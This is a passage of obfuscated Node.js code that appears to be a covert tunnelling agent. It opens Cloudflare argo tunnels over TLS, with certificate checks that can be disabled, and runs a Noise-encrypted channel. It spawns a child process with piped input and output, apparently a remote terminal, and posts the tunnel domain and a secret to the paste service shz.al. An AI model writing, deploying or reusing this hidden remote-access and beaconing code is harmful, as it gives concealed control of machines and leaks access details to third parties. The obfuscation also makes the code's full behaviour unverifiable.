            }), p['on'](f[dP(0x779)], () => {
                o['fRzre'](l, c, p);
            });
        });
    });
}
function a0ay(a) {
    const dQ = a0aQ, b = [];
    for (let c = 0x0; c < a[dQ(0x147)][dQ(0x54b)]; c += 0x2) {
        b['push']([
            a['rawHeaders'][c],
            a[dQ(0x147)][c + 0x1]
        ]);
    }
    return b;
}
function a0az(a, b, c, d, f) {
    const dR = a0aQ, g = {
            'Swlzy': function (h, i) {
                return h(i);
            },
            'kqgYu': 'origin\x20must\x20be\x20an\x20http://\x20or\x20https://\x20URL',
            'lIEkY': function (h, i) {
                return h === i;
            },
            'WcKpL': dR(0x64d),
            'sTMKp': dR(0x592),
            'UZTqk': function (h, i) {
                return h === i;
            },
            'nkvnn': 'connection',
            'FxXKm': dR(0x53e),
            'nontD': dR(0x311),
            'Tprkp': 'Host',
            'cxaQQ': dR(0x5d5),
            'tbcfY': function (h, i) {
                return h(i);
            },
            'IBfFn': function (h, i) {
                return h + i;
            },
            'KBWCF': dR(0x3bf)
        };
    return new Promise((h, i) => {
        const dS = dR;
        let j;
        try {
            j = new URL(a);
        } catch (q) {
            g[dS(0x368)](i, new Error(dS(0x272)));
            return;
        }
        if (![
                'http:',
                dS(0x64d)
            ][dS(0x374)](j[dS(0x410)]) || !j['hostname']) {
            i(new Error(g[dS(0x60c)]));
            return;
        }
        const k = g['lIEkY'](j['protocol'], g[dS(0x76a)]), l = j[dS(0x2bb)] || (k ? 0x1bb : 0x50), m = {};
        for (const [r, s] of d) {
            const t = r[dS(0x44e)]();
            if (g[dS(0x5a6)](t, g['sTMKp']) || g[dS(0x721)](t, g[dS(0x40d)]) || g[dS(0x721)](t, g['FxXKm']) || g[dS(0x5a6)](t, g[dS(0x6aa)]))
                continue;
            m[r] = s;
        }
        m[g[dS(0x153)]] = j['host'];
        f[dS(0x54b)] && (m[g[dS(0x653)]] = g['tbcfY'](String, f[dS(0x54b)]));
        const n = c[dS(0x214)]('/') ? c : g[dS(0x11a)]('/', c), o = k ? a0h : a0g, p = o['request']({
                'hostname': j[dS(0x3fe)],
                'port': l,
                'path': n,
                'method': b,
                'headers': m,
                'timeout': 0x7530
            }, u => {
                const dT = dS;
                h({
                    'status': u[dT(0x713)],
                    'headers': a0ay(u),
                    'body': u
                });
            });
        p['on'](g[dS(0x218)], u => i(u)), p[dS(0x2b5)](f[dS(0x54b)] ? f : undefined);
    });
}
function a0aA(a) {
    const dU = a0aQ, b = {
            'gcjtH': function (c) {
                return c();
            },
            'FtnfE': function (c, d) {
                return c(d);
            },
            'msoHH': dU(0x2b5),
            'MHsDi': dU(0x52d),
            'QJdMY': dU(0x3d0),
            'tSaFV': 'latin1',
            'ZUozh': dU(0x3a4),
            'MnBpW': dU(0x3bf)
        };
    return new Promise((c, d) => {
        const dV = dU, f = {
                'sPOjv': 'error',
                'KtiXU': b[dV(0x38a)],
                'ePlzl': b[dV(0x470)],
                'ZmSYa': b[dV(0x78c)],
                'nsVhk': function (l) {
                    const dW = dV;
                    return b[dW(0x675)](l);
                },
                'bCMJZ': b['tSaFV'],
                'cwUmU': function (l, m, n) {
                    return l(m, n);
                },
                'NEFTC': function (l, m) {
                    return l > m;
                },
                'pvLMK': function (l, m) {
                    return l(m);
                },
                'MlNBU': function (l, m) {
                    return l + m;
                },
                'HSlIw': function (l) {
                    const dX = dV;
                    return b[dX(0x675)](l);
                }
            };
        let g = Buffer[dV(0x381)](0x0);
        const h = () => {
                const dY = dV;
                a['removeListener'](dY(0x3a4), i), a[dY(0x19b)](f[dY(0x3f9)], j), a[dY(0x19b)](f[dY(0x556)], k), a[dY(0x19b)](f[dY(0x3de)], k);
            }, i = l => {
                const dZ = dV;
                g = g['length'] ? Buffer[dZ(0x562)]([
                    g,
                    l
                ]) : l;
                const m = g[dZ(0x489)](f['ZmSYa']);
                if (m < 0x0)
                    return;
                f[dZ(0x5d0)](h);
                const n = g[dZ(0x74f)](0x0, m)['toString'](f[dZ(0x185)]), o = n[dZ(0x696)]('\x0d\x0a'), p = o[0x0][dZ(0x696)]('\x20'), q = f[dZ(0x6b7)](parseInt, p[0x1], 0xa);
                if (!Number[dZ(0x44b)](q)) {
                    d(new Error(dZ(0x652)));
                    return;
                }
                const r = [];
                for (let s = 0x1; s < o[dZ(0x54b)]; s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t[dZ(0x489)](':');
                    f[dZ(0x514)](u, 0x0) && r[dZ(0x385)]([
                        t[dZ(0x23b)](0x0, u)['trim'](),
                        t[dZ(0x23b)](u + 0x1)[dZ(0x42d)]()
                    ]);
                }
                f['pvLMK'](c, {
                    'status': q,
                    'headers': r,
                    'rest': g[dZ(0x74f)](f[dZ(0x2b4)](m, 0x4))
                });
            }, j = l => {
                const e0 = dV;
                b[e0(0x675)](h), b[e0(0x605)](d, l);
            }, k = () => {
                const e1 = dV;
                f[e1(0x1db)](h), f['pvLMK'](d, new Error(e1(0x454)));
            };
        a['on'](b[dV(0x455)], i), a['on'](b['MnBpW'], j), a['on'](b[dV(0x38a)], k), a['on'](dV(0x52d), k);
    });
}
function a0aB(a) {
    const e2 = a0aQ, b = {
            'qyrkI': e2(0x25c),
            'fMjZG': function (f, g) {
                return f === g;
            },
            'hmAVs': 'h2.cftunnel.com',
            'cfPKQ': e2(0x396),
            'aryOB': function (f, g) {
                return f !== g;
            },
            'Kfdji': function (f, g) {
                return f(g);
            },
            'bwOnH': e2(0x6be),
            'acMgS': e2(0x305),
            'FCClb': e2(0x699),
            'HRqoa': 'SAN\x20does\x20not\x20cover\x20h2.cftunnel.com'
        };
    if (!a || !a[e2(0x16c)])
        return e2(0x75b);
    if (b[e2(0x17d)](a[e2(0x16c)]['O'], 'CloudFlare,\x20Inc.'))
        return e2(0x4eb) + (a[e2(0x16c)]['O'] || '');
    if (!b[e2(0x5f1)](String, a[e2(0x16c)]['OU'] || '')['startsWith'](b[e2(0x584)]))
        return b['acMgS'] + (a[e2(0x16c)]['OU'] || '');
    if (!a[e2(0x2dc)] || a['subject']['CN'] !== e2(0x4c0))
        return b['FCClb'];
    const c = String(a[e2(0x3ec)] || '')[e2(0x696)](',')[e2(0x18d)](f => f[e2(0x42d)]()[e2(0x44e)]()), d = c['some'](f => {
            const e3 = e2;
            if (!f[e3(0x214)](b['qyrkI']))
                return ![];
            const g = f[e3(0x23b)](0x4);
            return b[e3(0x723)](g, b[e3(0x4f8)]) || b['fMjZG'](g, b[e3(0x11f)]) || g['startsWith']('*.') && b[e3(0x4f8)][e3(0x750)](g[e3(0x23b)](0x1));
        });
    if (!d)
        return b[e2(0x3c6)];
    return null;
}
function a0aC(a, b) {
    const e4 = a0aQ, c = {
            'Ehfpq': e4(0x366),
            'SNhNG': function (h, i) {
                return h !== i;
            },
            'enjFL': e4(0x397),
            'BGZtJ': function (h, i) {
                return h + i;
            },
            'XkxER': function (h, i) {
                return h + i;
            },
            'ZcDbZ': e4(0x544),
            'zYbwH': e4(0x10e),
            'XzlYL': e4(0x3bf),
            'SLuHG': function (h, i) {
                return h + i;
            },
            'fZeYn': e4(0x44a),
            'slqOy': '\x20failed:\x20',
            'BQfqr': e4(0x460),
            'bQTdo': function (h) {
                return h();
            }
        }, d = a0Z[e4(0x23b)]()[e4(0x754)](() => Math[e4(0x444)]() - 0.5);
    let f = null;
    const g = async () => {
        const e9 = e4;
        for (const h of d) {
            try {
                return await new Promise((i, j) => {
                    const e6 = a0b, k = {
                            'AGVNk': function (m, n) {
                                return m + n;
                            },
                            'wuXfh': c['Ehfpq'],
                            'cfbno': function (m, n) {
                                const e5 = a0b;
                                return c[e5(0x5f2)](m, n);
                            },
                            'qPykr': c[e6(0x787)],
                            'KReqS': function (m, n) {
                                const e7 = e6;
                                return c[e7(0x211)](m, n);
                            },
                            'wencl': function (m, n) {
                                return c['XkxER'](m, n);
                            },
                            'JJcKB': c['ZcDbZ']
                        }, l = a0j[e6(0x766)]({
                            'host': h,
                            'port': a0a0,
                            'ALPNProtocols': ['h2'],
                            'servername': c['zYbwH'],
                            'rejectUnauthorized': ![]
                        });
                    l[e6(0x6a0)](0x2710, () => l[e6(0x371)](new Error('connection\x20timeout'))), l['on'](c[e6(0x26b)], j), l['on'](e6(0x661), () => {
                        const e8 = e6;
                        if (a) {
                            const n = a0aB(l['getPeerCertificate'](![]));
                            if (n) {
                                l[e8(0x371)](new Error(k['AGVNk'](k[e8(0x493)], n)));
                                return;
                            }
                        }
                        const m = l[e8(0x552)];
                        if (m && k[e8(0x55a)](m, 'h2')) {
                            l[e8(0x371)](new Error(k[e8(0x578)]));
                            return;
                        }
                        l[e8(0x6a0)](0x0), b[e8(0x6c8)](k[e8(0x5b4)](k[e8(0x708)](k[e8(0x708)](k['JJcKB'], h), ':'), a0a0)), i(l);
                    });
                });
            } catch (i) {
                f = i, b[e9(0x379)](c[e9(0x364)](c[e9(0x364)](c['fZeYn'] + h, c[e9(0x1f8)]), i));
            }
        }
        throw new Error(c[e9(0x364)](c['BQfqr'], f));
    };
    return c[e4(0x4a6)](g);
}
const a0aD = 0x2;
function a0aE(a) {
    const ea = a0aQ, b = {
            'rbiBc': function (c, d) {
                return c === d;
            },
            'JxkEs': ea(0x5f4),
            'OBAfN': ea(0x43c)
        };
    if (b['rbiBc'](typeof a, b['JxkEs'])) {
        const c = a[ea(0x42d)]();
        if (c)
            try {
                return JSON[ea(0x65d)](c);
            } catch (d) {
            }
        return {};
    }
    return a && b[ea(0x5c9)](typeof a, b[ea(0x38e)]) ? a : {};
}
class a0aF {
    constructor(a) {
        const eb = a0aQ;
        this[eb(0x34d)] = a, this[eb(0x5b9)] = new Map();
    }
    async [a0aQ(0x3cf)](a, b) {
        const ec = a0aQ, c = {
                'rxRBw': function (l, m) {
                    return l > m;
                },
                'uOgOW': function (l, m) {
                    return l(m);
                },
                'RlQzP': ec(0x61e),
                'jGIQj': function (l, m) {
                    return l + m;
                },
                'GOmKU': ec(0x4f6),
                'UxPFp': 'https://',
                'EiLxH': ec(0x628)
            }, d = this['tunnels']['get'](a) || [];
        if (c['rxRBw'](d[ec(0x54b)], 0x0) && !b) {
            const l = new Error(ec(0x550) + a + ec(0x4a0));
            l[ec(0x296)] = 0x199, l[ec(0x2bb)] = a;
            throw l;
        }
        let f, g, h, i;
        try {
            [f, g, h, i] = await c[ec(0x5fe)](a0ar, c[ec(0x3ef)]);
        } catch (m) {
            const n = new Error(c[ec(0x4ba)](c[ec(0x5fa)], m[ec(0x257)]));
            n[ec(0x296)] = 0x1f4, n[ec(0x2bb)] = a;
            throw n;
        }
        const j = f[ec(0x214)](ec(0x40e)) ? f : c[ec(0x4ba)](c[ec(0x3bd)], f), k = {
                'tunnelDomain': j,
                'port': a,
                'createdAt': new Date()['toISOString']()[ec(0x5f7)](/\.\d{3}Z$/, 'Z'),
                'stopped': ![],
                'sock': null,
                'runPromise': null
            };
        return k[ec(0x2b2)] = this[ec(0x28c)](k, g, h, i)[ec(0x69b)](o => this[ec(0x34d)][ec(0x379)](ec(0x3fa) + j + ec(0x2b9) + o[ec(0x257)])), d['push'](k), this[ec(0x5b9)][ec(0x2c3)](a, d), this[ec(0x34d)]['info'](c[ec(0x4ba)](c[ec(0x4ba)](ec(0x1df), j) + c['EiLxH'], a)), k;
    }
    [a0aQ(0x622)]() {
        const ed = a0aQ, a = [], b = [...this[ed(0x5b9)]['keys']()]['sort']((c, d) => c - d);
        for (const c of b) {
            for (const d of this['tunnels'][ed(0x4b8)](c)) {
                a['push']({
                    'tunnel_domain': d[ed(0x57a)],
                    'port': d[ed(0x2bb)],
                    'created_at': d[ed(0x50c)]
                });
            }
        }
        return a;
    }
    async ['remove'](a, b) {
        const ee = a0aQ, c = {
                'rprXB': function (i, j) {
                    return i === j;
                },
                'JRotL': function (i, j) {
                    return i === j;
                },
                'Anpfs': function (i, j) {
                    return i > j;
                },
                'wjerd': function (i, j) {
                    return i === j;
                },
                'rWBEg': function (i, j) {
                    return i + j;
                },
                'OUeHt': ee(0x1e5)
            }, d = this[ee(0x5b9)][ee(0x4b8)](a) || [];
        if (d[ee(0x54b)] === 0x0)
            return {
                'status': 0x194,
                'message': ee(0x472) + a
            };
        let f;
        if (c[ee(0x755)](b, undefined) || c[ee(0x755)](b, null) || c[ee(0x631)](b, '')) {
            if (c[ee(0x372)](d[ee(0x54b)], 0x1))
                return {
                    'status': 0x199,
                    'message': ee(0x557) + a + ee(0x647)
                };
            f = d;
        } else {
            f = d[ee(0x6ab)](i => i[ee(0x57a)] === b);
            if (c[ee(0x32e)](f[ee(0x54b)], 0x0))
                return {
                    'status': 0x194,
                    'message': ee(0x472) + a + ee(0x3a3) + b
                };
        }
        const g = [];
        for (const i of f) {
            i[ee(0x78b)] = !![];
            if (i[ee(0x51e)] !== null)
                try {
                    i[ee(0x51e)]['destroy']();
                } catch (j) {
                }
            await i[ee(0x2b2)]['catch'](() => {
            }), g[ee(0x385)]({
                'tunnel_domain': i[ee(0x57a)],
                'port': i[ee(0x2bb)],
                'created_at': i[ee(0x50c)]
            });
        }
        const h = d[ee(0x6ab)](k => !k[ee(0x78b)]);
        c[ee(0x372)](h[ee(0x54b)], 0x0) ? this[ee(0x5b9)][ee(0x2c3)](a, h) : this[ee(0x5b9)]['delete'](a);
        for (const k of g) {
            this[ee(0x34d)][ee(0x6c8)](c['rWBEg'](c[ee(0x4d2)], k[ee(0x6dc)]));
        }
        return {
            'status': 'ok',
            'deleted': g[ee(0x54b)],
            'tunnels': g
        };
    }
    async ['_runLoop'](a, b, c, d) {
        const ef = a0aQ, f = {
                'qeYUw': function (h, i) {
                    return h + i;
                },
                'GZTVm': ef(0x48e),
                'KCMPx': function (h, i) {
                    return h + i;
                },
                'KRRfa': 'argo\x20tunnel\x20',
                'mtUOG': ef(0x3b7),
                'FcoKt': function (h, i) {
                    return h !== i;
                }
            }, g = f[ef(0x63d)](ef(0x4b6), a[ef(0x2bb)]);
        while (!a[ef(0x78b)]) {
            let h = null;
            try {
                const i = String(process.env.KISAMA_EDGE_INSECURE || '')[ef(0x44e)]() !== f['GZTVm'];
                h = await a0aC(i, this[ef(0x34d)]);
                if (a[ef(0x78b)]) {
                    try {
                        h['destroy']();
                    } catch (j) {
                    }
                    break;
                }
                a[ef(0x51e)] = h, await new a0au(h, g, b, c, d, 0x0, this['log'], a['tunnelDomain'], ![], { 'printed': !![] })[ef(0x341)]();
            } catch (k) {
                !a[ef(0x78b)] && this[ef(0x34d)][ef(0x379)](f[ef(0x63d)](f[ef(0x63d)](f[ef(0x623)](f[ef(0x53a)], a[ef(0x57a)]), f[ef(0x189)]), k[ef(0x257)]));
            } finally {
                if (f['FcoKt'](h, null))
                    try {
                        h[ef(0x371)]();
                    } catch (l) {
                    }
                a['sock'] = null;
            }
            !a[ef(0x78b)] && await new Promise(m => setTimeout(m, a0aD * 0x3e8));
        }
    }
}
class a0aG {
    static ['_baseinfoHooked'] = ![];
    static [a0aQ(0x6cf)] = null;
    static [a0aQ(0x788)] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static [a0aQ(0x669)]() {
        const eg = a0aQ, a = a0O['KNAME'] || '';
        return a[eg(0x54b)] >= 0x3 && this[eg(0x788)][eg(0x590)](a);
    }
    static [a0aQ(0x2f5)](a) {
        const eh = a0aQ, b = {
                'RAkFi': function (c, d) {
                    return c + d;
                },
                'mJRXg': eh(0x3ba),
                'AWQls': eh(0x3bf),
                'QGdbU': function (c, d, f, g, h) {
                    return c(d, f, g, h);
                },
                'mgqKx': function (c, d) {
                    return c(d);
                },
                'xPZDJ': eh(0x438),
                'Lpgvg': function (c) {
                    return c();
                },
                'tgUvt': function (c, d) {
                    return c + d;
                },
                'LmzEw': 'hex',
                'orjFj': 'https://shz.al/',
                'ANXQp': 'POST'
            };
        return new Promise(c => {
            const ei = eh, d = a0O[ei(0x71b)], f = a0O[ei(0x726)] || a0O[ei(0x71b)], g = b[ei(0x5b6)](ei(0x1b6), a0k[ei(0x29c)](0xc)['toString'](b[ei(0x3b9)])), h = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        d
                    ],
                    [
                        's',
                        f
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], i = k => {
                    const ej = ei, l = k[ej(0x18d)](([m, n]) => Buffer[ej(0x6ef)]('--' + g + ej(0x22c) + m + ej(0x1e7) + n + '\x0d\x0a'));
                    return l[ej(0x385)](Buffer['from']('--' + g + '--\x0d\x0a')), Buffer[ej(0x562)](l);
                }, j = (k, l, m, n) => {
                    const ek = ei, o = new URL(k), p = a0h[ek(0x5a3)]({
                            'hostname': o[ek(0x3fe)],
                            'port': o['port'] || 0x1bb,
                            'path': b[ek(0x3e6)](o[ek(0x5c0)], o[ek(0x3ea)]),
                            'method': m,
                            'headers': {
                                'Content-Type': ek(0x1c2) + g,
                                'Content-Length': l ? l[ek(0x54b)] : 0x0,
                                'User-Agent': b[ek(0x400)]
                            }
                        }, q => {
                            const el = ek;
                            q[el(0x377)](), q['on'](el(0x2b5), () => n(q[el(0x713)]));
                        });
                    p['on'](b[ek(0x5da)], () => n(0x0));
                    if (l)
                        p[ek(0x336)](l);
                    p[ek(0x2b5)]();
                };
            try {
                j(b['orjFj'], i(h), b[ei(0x168)], k => {
                    const em = ei;
                    if (k === 0x199) {
                        const l = h[em(0x6ab)](([m]) => m !== 'n');
                        b[em(0x14e)](j, 'https://shz.al/~' + d + ':' + f, b[em(0x656)](i, l), b[em(0x35a)], () => c());
                    } else
                        b['Lpgvg'](c);
                });
            } catch (k) {
            }
        })[eh(0x689)](() => {
            const en = eh;
            this[en(0x6cf)] = a;
        })['catch'](() => {
        });
    }
    static [a0aQ(0x398)]() {
        const eo = a0aQ, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l[eo(0x617)](b) && a0l[eo(0x2f4)](b)[eo(0x467)]())
                return b;
        }
        try {
            return a0o[eo(0x247)]();
        } catch (c) {
            return process[eo(0x14c)]();
        }
    }
    static ['resolveDomainFilePath']() {
        const ep = a0aQ, a = {
                'Rmrde': ep(0x2b1),
                'EZDhn': ep(0x67d)
            };
        let b = (a0O['KPATH'] || '')[ep(0x42d)]();
        if (!b)
            return a0n[ep(0x6e2)](this[ep(0x398)](), a[ep(0x411)]);
        if (b[ep(0x214)](a[ep(0x469)]))
            b = b[ep(0x54b)] > 0x5 ? a0n[ep(0x6e2)](this[ep(0x398)](), b[ep(0x23b)](0x5)[ep(0x5f7)](/^[/\\]+/, '')) : this[ep(0x398)]();
        else
            b[ep(0x214)]('~') && (b = a0n[ep(0x249)](b[ep(0x5f7)](/^~(?=[/\\]|$)/, this['homeDir']())));
        return b;
    }
    static [a0aQ(0x3dc)](a) {
        const eq = a0aQ;
        this[eq(0x6cf)] = a;
        const b = this['resolveDomainFilePath']();
        try {
            a0l[eq(0x389)](a0n[eq(0x40b)](a0n[eq(0x249)](b)), { 'recursive': !![] }), a0l['writeFileSync'](b, a), a0C[eq(0x6c8)]('[KMODE]\x20📄\x20隧道域名已写入:\x20' + b);
        } catch (c) {
            a0C['warn'](eq(0x43d) + b + eq(0x2cb) + c[eq(0x257)]);
        }
    }
    static [a0aQ(0x4db)]() {
        const er = a0aQ, a = this['resolveDomainFilePath']();
        try {
            a0l[er(0x617)](a) && a0l[er(0x2f4)](a)[er(0x304)]() && (a0l[er(0x427)](a), a0C[er(0x6c8)](er(0x518) + a));
        } catch (b) {
            a0C[er(0x230)](er(0x3e4) + a + er(0x2cb) + b[er(0x257)]);
        }
    }
    static [a0aQ(0x593)]() {
        const es = a0aQ;
        !this[es(0x1a9)] && (this['_baseinfoHooked'] = !![], this[es(0x4db)]());
    }
    static ['startStdinListener']() {
        const et = a0aQ, a = {
                'OEVjo': function (b, c) {
                    return b === c;
                },
                'IvoKk': 'line',
                'jpduX': et(0x3bf)
            };
        try {
            const b = a0p[et(0x539)]({
                'input': process[et(0x46d)],
                'terminal': ![]
            });
            b['on'](a[et(0x58b)], c => {
                const eu = et;
                a[eu(0x1b2)](c[eu(0x42d)](), eu(0x1a8)) && console[eu(0x34d)](this['_domain'] || eu(0x175));
            }), b['on'](et(0x52d), () => {
            }), b['on'](a[et(0x4c4)], () => {
            });
        } catch (c) {
        }
    }
    static [a0aQ(0x529)](a) {
        const ev = a0aQ, b = {
                'IrlcP': ev(0x645),
                'aEVST': ev(0x35b)
            };
        if (a0O[ev(0x583)] === '2' && this[ev(0x669)]()) {
            a0C[ev(0x6c8)](b[ev(0x394)]), a[ev(0x3cf)](a0O[ev(0x5b7)])[ev(0x689)](c => this['reportShzal'](c[ev(0x57a)]))['catch'](() => {
            });
            return;
        }
        a0C[ev(0x6c8)](b[ev(0x428)]), a[ev(0x3cf)](a0O[ev(0x5b7)])[ev(0x689)](c => {
            const ew = ev;
            this[ew(0x3dc)](c[ew(0x57a)]);
        })['catch'](c => {
            const ex = ev;
            a0C['warn'](ex(0x197) + c[ex(0x257)]);
        }), this['startStdinListener']();
    }
}
let a0aH = null, a0aI = null;
const a0aJ = new Promise((a, b) => {
    const ey = a0aQ, c = {
            'ZuNfG': ey(0x727),
            'IJJTX': ey(0x440),
            'ewOZc': function (d) {
                return d();
            },
            'xXQPe': 'Noise\x20WASM\x20module\x20loaded\x20successfully',
            'iuQXu': function (d) {
                return d();
            },
            'gjnky': ey(0x3ac),
            'IRcZr': function (d) {
                return d();
            }
        };
    try {
        a0x(function (d) {
            const ez = ey;
            if (!d) {
                a0aI = new Error(c[ez(0x1a2)]), a0C[ez(0x230)](c[ez(0x62c)], a0aI[ez(0x257)]), c[ez(0x479)](a);
                return;
            }
            a0aH = d, a0C['debug'](c[ez(0x1d9)]), c['iuQXu'](a);
        });
    } catch (d) {
        a0aI = d, a0C['warn'](c[ey(0x356)], d['message']), c[ey(0x2d9)](a);
    }
});
process['on'](a0aQ(0x785), (a, b) => {
    const eA = a0aQ, c = { 'QvezF': eA(0x32f) };
    a0C[eA(0x3bf)](c[eA(0x3f8)], a);
}), process['on'](a0aQ(0x5e9), a => {
    const eB = a0aQ;
    a0C['error'](eB(0x458), a), process['exit'](0x1);
});
class a0aK {
    constructor(a, b, c) {
        const eC = a0aQ, d = { 'gWwvN': eC(0x6e3) }, f = d[eC(0x501)][eC(0x696)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this['hs'] = null;
                continue;
            case '1':
                this[eC(0x2b6)] = null;
                continue;
            case '2':
                this[eC(0x771)] = null;
                continue;
            case '3':
                this[eC(0x1c8)] = b;
                continue;
            case '4':
                this[eC(0x582)] = ![];
                continue;
            case '5':
                this['expectedRemotePubB64'] = c;
                continue;
            case '6':
                this[eC(0x50a)] = a;
                continue;
            }
            break;
        }
    }
    async [a0aQ(0x30d)]() {
        const eD = a0aQ, a = {
                'iPkns': eD(0x414),
                'wQkrc': eD(0x4a4),
                'csvFI': eD(0x348),
                'cGSRF': 'base64'
            };
        await a0aJ;
        if (!a0aH)
            throw a0aI || new Error(a[eD(0x33d)]);
        const b = a0aH, c = this[eD(0x50a)] ? b[eD(0x5b5)]['NOISE_ROLE_INITIATOR'] : b[eD(0x5b5)]['NOISE_ROLE_RESPONDER'];
        this['hs'] = b[eD(0x664)](a[eD(0x68d)], c);
        const d = Buffer[eD(0x6ef)](a[eD(0x601)]), f = this[eD(0x1c8)] ? Buffer['from'](this[eD(0x1c8)], a[eD(0x183)]) : null, g = this[eD(0x2e6)] ? Buffer['from'](this[eD(0x2e6)], eD(0x1fc)) : null;
        this['hs'][eD(0x43f)](d, f, g, null);
    }
    ['processHandshake'](a) {
        const eE = a0aQ, b = {
                'ULXZx': function (d, f) {
                    return d > f;
                },
                'qExtZ': function (d, f) {
                    return d === f;
                }
            };
        if (this[eE(0x582)])
            return Buffer[eE(0x381)](0x0);
        const c = a0aH;
        a && b[eE(0x3b6)](a[eE(0x54b)], 0x0) && b['qExtZ'](this['hs'][eE(0x391)](), c[eE(0x5b5)][eE(0x53f)]) && this['hs'][eE(0x181)](a);
        if (b[eE(0x681)](this['hs'][eE(0x391)](), c[eE(0x5b5)][eE(0x2b8)]))
            return this[eE(0x751)](), Buffer[eE(0x381)](0x0);
        if (b['qExtZ'](this['hs']['GetAction'](), c[eE(0x5b5)]['NOISE_ACTION_WRITE_MESSAGE'])) {
            const d = this['hs']['WriteMessage'](new Uint8Array(0x0));
            return this['hs']['GetAction']() === c[eE(0x5b5)][eE(0x2b8)] && this[eE(0x751)](), Buffer[eE(0x6ef)](d);
        }
        return Buffer[eE(0x381)](0x0);
    }
    ['_splitAndFinish']() {
        const eF = a0aQ, a = {
                'YbnmW': function (g, h) {
                    return g === h;
                },
                'RHfxy': 'Noise\x20peer\x20static\x20key\x20verification\x20failed'
            };
        let b = null;
        try {
            b = this['hs'][eF(0x632)]();
        } catch (g) {
            b = null;
        }
        const c = this['expectedRemotePubB64'] ? Buffer[eF(0x6ef)](this[eF(0x2e6)], 'base64') : null, d = b && c && a['YbnmW'](b[eF(0x54b)], c[eF(0x54b)]) && a0k[eF(0x5e0)](Buffer['from'](b), c);
        if (!d)
            throw new Error(a[eF(0x5d6)]);
        const f = this['hs'][eF(0x510)]();
        this[eF(0x2b6)] = f[0x0], this[eF(0x771)] = f[0x1], this['handshakeFinished'] = !![];
        try {
            if (this['hs'])
                this['hs'][eF(0x407)]();
        } catch (h) {
        }
        this['hs'] = null;
    }
    ['encrypt'](a) {
        const eG = a0aQ;
        if (!this[eG(0x582)])
            throw new Error(eG(0x387));
        const b = new Uint8Array(0x0), c = new Uint8Array(a);
        return Buffer[eG(0x6ef)](this[eG(0x2b6)][eG(0x1d0)](b, c));
    }
    [a0aQ(0x32d)](a) {
        const eH = a0aQ, b = { 'RVJdV': eH(0x5c3) };
        if (!this[eH(0x582)])
            throw new Error(b[eH(0x5a7)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[eH(0x6ef)](this[eH(0x771)]['DecryptWithAd'](c, d));
    }
    [a0aQ(0x407)]() {
        const eI = a0aQ;
        try {
            if (this[eI(0x2b6)])
                this['sendCipher'][eI(0x407)]();
        } catch (a) {
        }
        try {
            if (this[eI(0x771)])
                this['recvCipher']['free']();
        } catch (b) {
        }
        try {
            if (this['hs'])
                this['hs'][eI(0x407)]();
        } catch (c) {
        }
        this[eI(0x2b6)] = null, this[eI(0x771)] = null, this['hs'] = null;
    }
}
class a0aL {
    constructor(a, b, c) {
        const eJ = a0aQ, d = { 'RrZPB': eJ(0x3c2) }, f = d[eJ(0x50b)][eJ(0x696)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[eJ(0x14c)] = c;
                continue;
            case '1':
                this[eJ(0x2e8)] = null;
                continue;
            case '2':
                this[eJ(0x35e)] = null;
                continue;
            case '3':
                this['env'] = b;
                continue;
            case '4':
                this[eJ(0x6a5)] = a;
                continue;
            case '5':
                this['pid'] = 0x0;
                continue;
            case '6':
                this[eJ(0x68f)] = null;
                continue;
            }
            break;
        }
    }
    [a0aQ(0x474)]() {
        const eK = a0aQ, a = {
                'LGlFv': function (c, d) {
                    return c || d;
                },
                'ZkYfF': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'syOaS': eK(0x6f3),
                'MrDfM': eK(0x3a4),
                'zCiko': eK(0x6c0)
            };
        this[eK(0x68f)] = a[eK(0x21f)](a0r, this[eK(0x6a5)], [], {
            'env': this[eK(0x350)],
            'cwd': this[eK(0x14c)],
            'windowsHide': !![],
            'stdio': [
                a[eK(0x507)],
                eK(0x6f3),
                'pipe'
            ]
        }), this[eK(0x49a)] = this[eK(0x68f)]['pid'] || 0x0;
        const b = this;
        this[eK(0x68f)]['stdout']['on'](a[eK(0x3ce)], c => b[eK(0x64b)](c)), this['proc']['stderr']['on'](a['MrDfM'], c => b[eK(0x64b)](c)), this['proc']['on'](a['zCiko'], (c, d) => {
            const eL = eK;
            if (b[eL(0x2e8)])
                b[eL(0x2e8)]({
                    'exitCode': c,
                    'signal': a['LGlFv'](d, null)
                });
        });
    }
    [a0aQ(0x64b)](a) {
        const eM = a0aQ, b = { 'TgnwJ': 'utf-8' };
        if (this[eM(0x35e)])
            this[eM(0x35e)](a[eM(0x6b0)](b[eM(0x619)]));
    }
    ['onData'](a) {
        const eN = a0aQ;
        return this[eN(0x35e)] = a, {
            'dispose': () => {
                const eO = eN;
                this[eO(0x35e)] = null;
            }
        };
    }
    [a0aQ(0x3cb)](a) {
        const eP = a0aQ;
        return this[eP(0x2e8)] = a, {
            'dispose': () => {
                const eQ = eP;
                this[eQ(0x2e8)] = null;
            }
        };
    }
    [a0aQ(0x336)](a) {
        const eR = a0aQ;
        if (!this['proc'] || !this[eR(0x68f)]['stdin'])
            return;
        try {
            this[eR(0x68f)][eR(0x46d)][eR(0x336)](a);
        } catch (b) {
        }
    }
    [a0aQ(0x4a1)]() {
    }
    [a0aQ(0x3dd)]() {
        const eS = a0aQ;
        try {
            if (this['proc'])
                this['proc'][eS(0x3dd)]();
        } catch (a) {
        }
    }
}
class a0aM {
    constructor() {
        const eT = a0aQ, a = {
                'lvBqN': eT(0x4d0),
                'vXKGu': eT(0x654)
            }, b = a['lvBqN'][eT(0x696)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[eT(0x3b8)] = a0O[eT(0x1b1)]['control'][eT(0x5c2)];
                continue;
            case '1':
                this[eT(0x318)] = a0O[eT(0x1b1)][eT(0x452)][eT(0x55e)];
                continue;
            case '2':
                this[eT(0x457)] = null;
                continue;
            case '3':
                this[eT(0x254)] = null;
                continue;
            case '4':
                this[eT(0x51b)] = [];
                continue;
            case '5':
                this['msgResolvers'] = [];
                continue;
            case '6':
